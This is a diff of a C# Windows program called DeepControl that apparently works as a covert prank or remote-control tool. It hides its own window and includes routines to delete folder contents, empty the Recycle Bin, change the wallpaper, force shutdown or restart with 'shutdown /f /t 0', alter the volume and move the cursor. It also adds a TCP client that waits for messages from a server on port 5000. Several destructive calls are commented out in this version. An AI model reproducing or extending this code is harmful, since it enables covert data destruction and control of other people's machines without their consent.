@@ -1,17 +1,43 @@
+
+
 namespace DeepControl
 {
-    using System.Drawing;
-    using System;
-    using System.Threading;
     using System.Runtime.InteropServices;
+    using Microsoft.VisualBasic.Devices;
     using System.Windows.Forms;
-    using System.IO;
+    using NAudio.CoreAudioApi;
     using System.Diagnostics;
-    using System.Net;
     using System.Net.Sockets;
+    using System.Threading;
+    using System.Drawing;
     using System.Text;
+    using System.Net;
+    using System.IO;
+    using System;
 
-    public partial class DeepControlForm : Form
+    using System.Threading.Tasks;
+    public class MouseMover
+    {
+        [DllImport("user32.dll")]
+        private static extern bool SetCursorPos(int X, int Y);
+
+        [DllImport("user32.dll")]
+        private static extern bool GetCursorPos(out POINT lpPoint);
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct POINT
+        {
+            public int X;
+            public int Y;
+        }
+
+        public static void MoveMouse(int deltaX, int deltaY)
+        {
+            GetCursorPos(out POINT currentPos);
+            SetCursorPos(currentPos.X + deltaX, currentPos.Y + deltaY);
+        }
+    }
+    public partial class  DeepControlForm : Form
     {
 
         [DllImport("user32.dll", CharSet = CharSet.Auto)]
@@ -21,9 +47,66 @@ namespace DeepControl
         {
             InitializeComponent();
             InicializarIcono();
-            limpiarCarpetas();
-            ColocarFondo();
-            RecycleBin.EmptyRecycleBin();
+            //limpiarCarpetas();
+            //ColocarFondo();
+            //RecycleBin.EmptyRecycleBin();
+            manipularVolumen(0.1f);
+            //Thread.Sleep(7000); 
+            //MouseMover.MoveMouse(100, 100);
+            /*for(int i =1000;i<10000;i=i+100)
+            {
+                
+                Console.Beep(i, 500);
+            }
+            */
+            //Console.Beep(500, 1000);
+            //ReiniciarEquipo();
+            //ApagarEquipo();
+            Cliente();
+        }
+        static async Task Cliente()
+        {
+            string serverIp = "127.0.0.1";
+            int port = 5000;
+
+            using TcpClient client = new TcpClient(serverIp, port);
+            NetworkStream stream = client.GetStream();
+            Console.WriteLine("Conectado al servidor.");
+
+            byte[] buffer = new byte[1024];
+            int bytesRead;
+
+            while (true)
+            {
+                bytesRead = await stream.ReadAsync(buffer, 0, buffer.Length);
+                if (bytesRead > 0)
+                {
+                    string message = Encoding.UTF8.GetString(buffer, 0, bytesRead);
+                    MessageBox.Show($"Mensaje recibido: {message}");
+                }
+            }
+        }
+        private static void ApagarEquipo()
+        {
+            Process.Start(new ProcessStartInfo("shutdown", "/s /f /t 0")
+            {
+                CreateNoWindow = true,
+                UseShellExecute = false
+            });
+        }
+        private static void ReiniciarEquipo()
+        {
+            Process.Start(new ProcessStartInfo("shutdown", "/r /f /t 0")
+            {
+                CreateNoWindow = true,
+                UseShellExecute = false
+            });
+        }
+        public void manipularVolumen(float volumen)
+        {
+            var enumerator = new MMDeviceEnumerator();
+            var device = enumerator.GetDefaultAudioEndpoint(DataFlow.Render, Role.Multimedia);
+            device.AudioEndpointVolume.MasterVolumeLevelScalar = volumen;
         }
         public void InicializarIcono()
         {
@@ -103,14 +186,7 @@ namespace DeepControl
         {
             this.Visible = false;
         }
-        static async Task Metodo()
-        {
-            for (int i = 0; i < 10; i++)
-            {
-                MessageBox.Show("Este es un mensaje de información.", "Información", MessageBoxButtons.OK, MessageBoxIcon.Information);
-                await Task.Delay(3000); // Dormir por 3000 milisegundos (3 segundos)
-            }
-        }
+        
         static void DeleteAllFiles(string directoryPath)
         {
             if (Directory.Exists(directoryPath))
